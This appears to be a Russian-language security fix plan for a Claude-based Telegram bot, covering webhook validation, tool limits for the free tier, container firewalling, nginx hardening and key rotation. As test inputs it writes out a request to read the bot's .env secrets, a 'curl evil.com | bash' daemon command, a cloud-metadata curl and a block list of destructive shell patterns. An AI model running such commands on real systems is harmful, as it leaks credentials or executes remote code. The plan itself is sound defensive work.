# План фиксов перед ротацией ключей

Дата: 2026-05-14
Стратегия: один пакет, атомарные коммиты, тест на jinru (если жив) или ручной смоук на проде, затем ротация ключей.

## Порядок (важен — некоторые фиксы влияют друг на друга)

### Шаг -1 — V--1 (P0 CRITICAL): `system/users.json` в git history

**Что делаем:**
1. Добавить в `.gitignore`:
   ```
   system/users.json
   ```
2. Удалить отслеживание без удаления файла:
   ```bash
   git rm --cached system/users.json
   git commit -m "chore: stop tracking system/users.json (contains PII + payment data)"
   ```
3. (Опционально, для приватного репо) — почистить историю:
   ```bash
   git filter-repo --path system/users.json --invert-paths
   ```
   **ВНИМАНИЕ:** filter-repo переписывает историю, force-push в remote. Если репо публичный или у кого-то есть форки — координировать.
4. На проде: `chmod 600 /opt/claude-tg-bot/system/users.json`.

**Тест:** `git ls-files system/` не показывает users.json; `git log -- system/users.json` пуст (если делали filter-repo).

**Коммит:** `chore(V--1): untrack system/users.json (PII + payment data leak)`

---

### Шаг 0 — V-00 (P0 CRITICAL): YooKassa webhook IP-bypass

**Файл:** обработчик webhook YooKassa (найти точно через `grep -rn "isYuKassaIp\|webhook" src/`)
**Что делаем:**
1. Найти строку `if (clientIp && !isYuKassaIp(clientIp))` и заменить на:
   ```ts
   if (!clientIp || !isYuKassaIp(clientIp)) {
     return new Response("Forbidden", { status: 403 });
   }
   ```
2. Если webhook идёт через nginx — обязательно добавить `proxy_set_header X-Real-IP $remote_addr;` в nginx config и читать именно `X-Real-IP`, а не `X-Forwarded-For` (последний легко подделать, если нет реверс-прокси настроек).
3. **БОНУС:** проверить, что YooKassa подписывает webhook (документация). Если есть — добавить HMAC проверку.

**Тест:** `curl -X POST http://localhost:<port>/webhook -d '{"event":"payment.succeeded",...}'` должен вернуть 403 (раньше пропускал).

**Коммит:** `fix(V-00): reject YooKassa webhook with missing IP`

---

### Шаг 1 — V-01 (P0): free-tier без файловых тулов

**Файл:** `src/config.ts` (функция `getUserProfile`)
**Что делаем:**
1. Завести константу `FREE_DISALLOWED_TOOLS`:
   ```ts
   const FREE_DISALLOWED_TOOLS = [
     "Bash", "BashOutput", "KillShell",
     "Read", "Write", "Edit", "MultiEdit",
     "Glob", "Grep", "NotebookEdit",
     "mcp__container__Bash",
     "mcp__send-file__deliver",
     "mcp__pollinations-image__generate",
     "mcp__openrouter-image__generate",
     "mcp__connect-google__connect",
     "WebSearch", // у DeepSeek и так не работает, но на всякий
   ];
   ```
2. В guest-ветке `getUserProfile`:
   ```ts
   const baseDisallowed = ["WebSearch"];
   const tierDisallowed = rawTier === 'free' ? FREE_DISALLOWED_TOOLS : [];
   const disallowedTools = Array.from(new Set([...baseDisallowed, ...tierDisallowed]));
   ```
3. Обновить `systemPrompt` для free — добавить блок: «В free-тарифе ты можешь только разговаривать. Для работы с файлами, кодом, картинками и Google-инструментами нужна платная подписка (`/pay`). Если просят прочитать/выполнить — вежливо откажи и предложи апгрейд.»
4. Удалить ветку `useContainer = profile.containerEnabled && !isOwner` зависимость от tier — для free она и так возвращает false. Не меняем, но добавляем явный комментарий что free идёт без контейнера и без тулов.

**Тест на jinru:**
- От второго аккаунта (Артём) отправить «cat /opt/claude-tg-bot/.env». Бот должен отказать (потому что Bash в disallowed) и предложить апгрейд.
- Отправить «прочитай файл X в моей папке». Должен отказать.
- Отправить «напиши стих про осень». Должен ответить как обычно.

**Коммит:** `fix(V-01): disable file/shell tools for free-tier guests`

---

### Шаг 2 — V-05 (P1): pdftotext через контейнер

**Файл:** `src/handlers/document.ts:227`
**Что делаем:**
1. Если у юзера есть контейнер (`profile.containerEnabled === true`) — запускать pdftotext **внутри его контейнера** через `containerManager.exec(userId, ['pdftotext', '-layout', '/inbox/file.pdf', '-'])`. Это уже бывшая практика для других утилит.
2. Если контейнера нет (free-tier) — отказать в обработке PDF с понятным сообщением: «PDF доступны в платном тарифе. Для текстовых сообщений у тебя нет ограничений.»
3. Аналогично для DOCX/XLSX/архивов и других handler-ов, которые сейчас работают на хосте.

**Это закрывает риск зловредного PDF от free-юзера → крах процесса бота / RCE через poppler-CVE.**

**Коммит:** `fix(V-05): route pdftotext through guest container; reject PDF for free-tier`

---

### Шаг 3 — V-03 (P1): включить AUDIT_LOG_JSON

**Файл:** `.env` на проде (через ssh, без rsync)
**Что делаем:**
1. `ssh root@89.167.125.175 'echo "AUDIT_LOG_JSON=true" >> /opt/claude-tg-bot/.env'`
2. Рестарт бота.

Альтернатива: поставить `AUDIT_LOG_JSON=true` в `.env.example` и обновить через ручную правку на сервере (не rsync — он не трогает .env).

**Тест:** после рестарта посмотреть `/var/log/claude-tg-bot.audit.log` — должен быть JSON по строке.

**Коммит:** не код-фикс, только конфиг сервера. Зафиксировать в README/HANDOFF.

---

### Шаг 4 — V-04 (P1): X-Frame-Options DENY → починить дашборд

**Файл:** `scripts/nginx/snippets/security-headers.conf:3`
**Что делаем:**
1. Убрать строку `add_header X-Frame-Options "DENY" always;` из общего сниппета.
2. Добавить в server-блоки, где iframe **не нужен** (api-only): отдельные snippets с DENY.
3. Для `dash.proboi.site` и location `/dashboard` — оставить без X-Frame-Options (Telegram Mini App работает в iframe).

**Тест:** открыть Mini App в Telegram → дашборд должен показаться. До фикса — белая страница / "refused to connect".

**Коммит:** `fix(V-04): allow Telegram Mini App iframe by removing global X-Frame-Options DENY`

---

### Шаг 5 — V-02 (P1): memory-graph injection — добавить zod + HTML-escape

**Файл:** `src/memory/inject.ts`, `src/memory/graph.ts`
**Что делаем:**
1. В `sanitizeForPrompt` добавить замену `<` → `&lt;`, `>` → `&gt;` (Claude API JSON не страдает от HTML, но это снижает риск promp-injection если кто-то скопирует в HTML-рендер).
2. В `graph.ts` добавить zod-схему для узлов:
   ```ts
   const NodeSchema = z.object({
     id: z.string(),
     type: z.enum(['user', 'topic', 'task', 'memory']),
     label: z.string().max(500),
     data: z.record(z.string()).optional(),
   });
   ```
3. При загрузке графа: `NodeSchema.parse(node)` — невалидные узлы дропать с логом.

**Коммит:** `fix(V-02): zod-validate memory graph nodes; HTML-escape in sanitizeForPrompt`

---

### Шаг 6a — V-1A (P1): дедупликация YooKassa webhook

**Файл:** webhook-обработчик + `src/metering.ts` (или новая `src/payment.ts`)
**Что делаем:**
1. Создать таблицу в SQLite:
   ```sql
   CREATE TABLE IF NOT EXISTS processed_payments (
     payment_id TEXT PRIMARY KEY,
     event TEXT NOT NULL,
     processed_at INTEGER NOT NULL
   );
   ```
2. В webhook-handler: до обработки `INSERT OR IGNORE INTO processed_payments`. Если `changes() === 0` — это retry, вернуть 200 без действий.
3. Аналогично для `payment.canceled`, `refund.succeeded`.

**Тест:** дважды отправить тот же webhook payload — подписка должна продлиться 1 раз.

**Коммит:** `fix(V-1A): idempotency for YooKassa webhook via processed_payments table`

---

### Шаг 6b — V-1B (P1): chmod 600 на чувствительные файлы

**На проде через ssh (не код-фикс):**
```bash
ssh root@89.167.125.175 'chmod 600 /opt/claude-tg-bot/system/users.json /opt/claude-tg-bot/metering.sqlite /opt/claude-tg-bot/metering.sqlite-shm /opt/claude-tg-bot/metering.sqlite-wal /opt/claude-tg-bot/.env'
```

Дополнительно — добавить в systemd unit `ExecStartPre=/usr/bin/chmod 600 /opt/claude-tg-bot/.env /opt/claude-tg-bot/system/users.json /opt/claude-tg-bot/metering.sqlite` чтобы при следующем запуске права восстанавливались.

**Коммит:** конфиг сервера, доку обновить в `HANDOFF.md`.

---

### Шаг 6c — V-1C (P1): лимит длительности voice/audio

**Файл:** `src/handlers/voice.ts`, `src/handlers/audio.ts`
**Что делаем:**
1. До скачивания файла читать `ctx.message?.voice?.duration` или `audio.duration` (секунды от Telegram).
2. Сравнить с лимитом:
   ```ts
   const maxDuration = profile.tierConfig.tier === 'free' ? 300 : 1800; // 5/30 мин
   if (durationSec > maxDuration) {
     await replyFriendly(ctx, new Error(`voice too long`), "voice-duration");
     return;
   }
   ```
3. Для free — можно вообще запретить voice через `tierConfig.voiceEnabled` (он уже есть в типах — `voiceEnabled: true` для free, рассмотреть смену на false).

**Коммит:** `fix(V-1C): cap voice/audio duration per tier`

---

### Шаг 6d — V-1D (P1): bind Bun-серверов на 127.0.0.1

**Файлы:** `src/dashboard-server.ts:603`, `src/dashboard-server.ts:728`, `src/index.ts:409`
**Что делаем:**
1. Health-webhook (3847): bind на `127.0.0.1` — Telegram стучится не сюда, это внутренний healthcheck.
2. Dashboard (3848): bind на `127.0.0.1`, nginx проксирует.
3. Notify-bridge (3849): bind на guest-bridge IP (обычно `172.18.0.1`). Динамически получать через `docker network inspect claude-guest-net`, или захардкодить через env-var `GUEST_BRIDGE_IP`.

**Тест:** `curl http://89.167.125.175:3848/dashboard` извне должен теперь не отвечать (раньше отвечал). `curl http://127.0.0.1:3848/dashboard` с самого сервера — отвечает.

**Коммит:** `fix(V-1D): bind Bun servers to localhost / guest-bridge IP`

---

### Шаг 6e — V-1G..V-1J (P1): мелочь из новых отчётов

- **V-1G:** в `document.ts:157` добавить `if (filename.includes('..') || filename.startsWith('/')) reject;` поверх существующей санитизации (defense-in-depth).
- **V-1H:** `/tmp/pollinations/` → перейти на `/tmp/pollinations/${userId}/`. Убрать `pollinations` из общих `TEMP_PATHS`, перенести в per-user inbox.
- **V-1I:** в `parallel_mcp/server.ts:162` валидировать `task.cwd` через `isPathAllowedFor(cwd, TELEGRAM_PARALLEL_ALLOWED_PATHS)`. Если выходит за allowed — дропать subtask с ошибкой.
- **V-1J:** в реплай-to пайплайне санитизировать `reply_to.from.first_name` через ту же `sanitizeForPrompt`.

**Коммит:** `fix(V-1G..V-1J): tighten guest input validation`

---

### Шаг 7 — V-06 (P1): document.ts execFile вместо template literal

**Файл:** `src/handlers/document.ts`
**Что делаем:** найти все `Bun.$\`python3 -c ${script} ${filePath}\`` и заменить на:
```ts
import { execFile } from 'node:child_process';
import { promisify } from 'util';
const execFileAsync = promisify(execFile);
await execFileAsync('python3', ['-c', script, filePath]);
```

**Это снизит риск shell-injection при будущих правках, не меняет поведение сейчас.**

**Коммит:** `refactor(V-06): execFile-style shell calls in document.ts`

---

---

### Шаг 8 — V-22 (P1): firewall DROP для 169.254.169.254 из контейнеров

**Файл:** `scripts/firewall/docker-user-rules.sh`
**Что делаем:**
1. Добавить идемпотентное правило:
   ```bash
   iptables -C DOCKER-USER -s 172.18.0.0/16 -d 169.254.169.254 -j DROP 2>/dev/null \
     || iptables -I DOCKER-USER 1 -s 172.18.0.0/16 -d 169.254.169.254 -j DROP
   ```
2. Сохранить в `/etc/iptables/rules.v4` (через `netfilter-persistent save`).

**Тест:** `docker exec claude-user-893951298 curl --max-time 3 http://169.254.169.254/hetzner/v1/metadata` должен **зависнуть и упасть**.

**Коммит:** `fix(V-22): block Hetzner metadata from guest containers`

---

### Шаг 9 — V-21 (P1): inter-container isolation

**Файл:** `scripts/firewall/docker-user-rules.sh`
**Что делаем:**
1. Добавить:
   ```bash
   iptables -C DOCKER-USER -i claude-guest0 -o claude-guest0 -j DROP 2>/dev/null \
     || iptables -I DOCKER-USER 1 -i claude-guest0 -o claude-guest0 -j DROP
   ```
2. Альтернатива (глобально через docker daemon.json — но требует рестарта Docker и пересоздания сети, рискованнее):
   ```json
   {"icc": false}
   ```

**Тест:** из контейнера .2 `curl http://172.18.0.<любой_другой>:80` → должно зависнуть и упасть.

**Коммит:** `fix(V-21): block inter-container traffic on claude-guest0`

---

### Шаг 10 — V-23 (P1): server-side maxItems для parallel_mcp

**Файл:** `parallel_mcp/server.ts`
**Что делаем:** В обработчике `mcp__parallel__run` сразу после деструктуризации `tasks`:
```ts
if (!Array.isArray(tasks) || tasks.length < 2 || tasks.length > 10) {
  throw new Error("tasks: array of 2..10 items required");
}
```

**Тест:** Claude вызывает parallel с 50 задачами → MCP отдаёт ошибку, бот пишет «нельзя больше 10 параллельных».

**Коммит:** `fix(V-23): enforce parallel_mcp tasks.length <= 10 server-side`

---

### Шаг 11 — V-20 (P1): cgroup v2 disk-IO лимиты

**Файл:** `src/containers/spec.ts`, `/etc/docker/daemon.json` (опционально)
**Что делаем (вариант через systemd slice — проще):**
1. Создать `/etc/systemd/system/claude-guests.slice` с:
   ```
   [Slice]
   IOAccounting=true
   IOWriteBandwidthMax=/dev/sda 52428800
   IOReadBandwidthMax=/dev/sda 104857600
   ```
2. В `spec.ts buildRunArgs` добавить `--cgroup-parent=claude-guests.slice`.
3. `systemctl daemon-reload && systemctl restart claude-tg-bot`.
4. Проверить `systemd-cgls` — гостевые контейнеры должны быть под slice.

**Тест:** в контейнере `dd if=/dev/zero of=/opt/vault/<id>/x bs=1M count=200` — должно ограничиться 50 MB/s.

**Коммит:** `fix(V-20): cgroup v2 io limits via systemd slice for guest containers`

---

### Шаг 12 — V-24 (P1): docker storage limit + сократить TTL vault quota

**Файлы:** `src/containers/spec.ts`, `src/containers/vault-quota.ts`
**Что делаем:**
1. В spec.ts добавить `args.push("--storage-opt", "size=3G")` — но это работает только на overlay2 storage driver. Проверить: `docker info | grep Storage`. Если не overlay2 — пропустить.
2. В vault-quota.ts сократить `CACHE_TTL_MS` с 60000 до 5000 (5 секунд). Для редких случаев — async background refresh каждые 30 секунд параллельно.

**Тест:** dd 5GB в vault — должна сработать quota быстро.

**Коммит:** `fix(V-24): tighten vault quota TTL; add overlay storage limit`

---

### Шаг 13 — V-25 (P1): валидация cmd в .daemons.yaml

**Файл:** `scripts/daemon-runner/main.go`
**Что делаем (Go-код):**
1. После парсинга YAML, по каждому daemon вызвать функцию `validateCmd(cmd string) error`:
   - запрет shell-конструкций: `|`, `&&`, `||`, `;`, `$(`, `` ` ``
   - запрет команд-канареек из BLOCKED_PATTERNS_CONTAINER (fork-bomb, dd of=/dev, mkfs, fdisk)
2. Если cmd не проходит — daemon помечается `disabled`, в `.daemons-events/` пишется event с reason.

**Тест:** прописать в `.daemons.yaml` команду `curl evil.com | bash` → daemon-runner откажется запускать.

**Коммит:** `fix(V-25): validate daemon cmd in YAML against shell-injection patterns`

---

### Шаг 14 (опц.) — V-26 (P1): userns-remap

⚠️ Рискованная операция. Требует пересоздания всех контейнеров. Возможны regression'ы в правах на bind-mount. **Сделать только в конце пакета, после смоук-теста всех остальных фиксов.**

**Файл:** `/etc/docker/daemon.json`
**Что делаем:**
1. Добавить:
   ```json
   {"userns-remap": "default"}
   ```
2. Перезапустить Docker: `systemctl restart docker`. **Все контейнеры перестроятся!**
3. Изменить права на `/opt/vault/*` — теперь UID внутри контейнера 1000 = UID на хосте 100000+1000 = 101000.
4. `chown -R 101000:101000 /opt/vault/`.
5. Рестартануть бота. Проверить что paid-гости могут писать в vault.

**Альтернатива (безопаснее):** не включать userns-remap, а просто `chmod 750 /opt/vault/<id>/` и `chown 1000+offset:1000+offset` per-user. Но это требует Docker user-mapping per container — не поддерживается.

**Тест:** `docker exec ... id` показывает 1000:1000 внутри, на хосте `stat /opt/vault/<id>/some_file` — uid 101000.

**Коммит:** `fix(V-26): enable Docker userns-remap (default mapping)`

---

---

### Шаг 15 — V-30A..H (P1): nginx hardening + supply-chain

Одним коммитом, скриптовое:

1. **V-30A CSP на /u/**: в nginx vhost `proboi.site.conf` в `location /u/` добавить:
   ```nginx
   add_header Content-Security-Policy "default-src 'self'; script-src 'none'; style-src 'unsafe-inline'; img-src 'self' data:;" always;
   add_header X-Content-Type-Options "nosniff" always;
   ```
2. **V-30B TLS only 1.2/1.3**: в `nginx.conf` или snippet `ssl-params.conf`:
   ```nginx
   ssl_protocols TLSv1.2 TLSv1.3;
   ssl_prefer_server_ciphers off;
   ```
3. **V-30C rate-limit sync**: `nginx -T 2>/dev/null > /tmp/current-nginx.conf`, сравнить с репо, синхронизировать.
4. **V-30D design.proboi.site**: проверить vhost, если открытый — добавить `auth_basic` или удалить совсем.
5. **V-30F rsync exclude**: в `CLAUDE.md` и `scripts/deploy-jinru.sh` добавить `--exclude 'system/users.json'` в rsync.
6. **V-30G bun/node install hardening**: в `Dockerfile.user` запинить версии:
   ```dockerfile
   ARG BUN_VERSION=1.3.13
   RUN curl -fsSL https://github.com/oven-sh/bun/releases/download/bun-v${BUN_VERSION}/bun-linux-x64.zip -o /tmp/bun.zip \
     && echo "EXPECTED_SHA256  /tmp/bun.zip" | sha256sum -c \
     && unzip /tmp/bun.zip -d /usr/local/bin/ \
     && rm /tmp/bun.zip
   ```
7. **V-30H image digest**: после следующего `docker build`, прочитать `docker images --digests` и запинить в `src/containers/paths.ts`:
   ```ts
   export const SANDBOX_IMAGE = "claude-user-sandbox@sha256:472d89e2...";
   ```

**Коммит:** `harden(V-30A..H): nginx CSP, TLS 1.2+, rate-limit sync, rsync exclude, install hardening, image pinning`

---

## После всего пакета — ротация ключей

1. @BotFather: revoke + новый `TELEGRAM_BOT_TOKEN`
2. OpenAI dashboard: revoke `OPENAI_API_KEY`, новый key
3. OpenRouter dashboard: revoke + новый
4. DeepSeek dashboard: revoke + новый (или ротация всех ключей в пуле `system/deepseek-keys.json`)
5. Composio dashboard: revoke + новый
6. Обновить `.env` на проде через ssh (не rsync!)
7. `systemctl restart claude-tg-bot`
8. Проверка: бот отвечает на /start, второй аккаунт (Артём) **не может** прочитать `.env`, дашборд открывается в Telegram.

## P2 — после ротации

V-07..V-28 — reliability и мелочи. Отдельная сессия, без срочности. Список в `VULNERABILITIES.md`.

## Что НЕ трогаем в этом пакете

- Composio-related (уже закрыто, не делаем регрессий)
- Любые рефакторинги ради рефакторинга
- Любые правки `mcp__container__Bash` (он уже под `checkContainerCommandSafety`)
- Tier-pricing логика (V-01 это про tools, не про прайсинг)
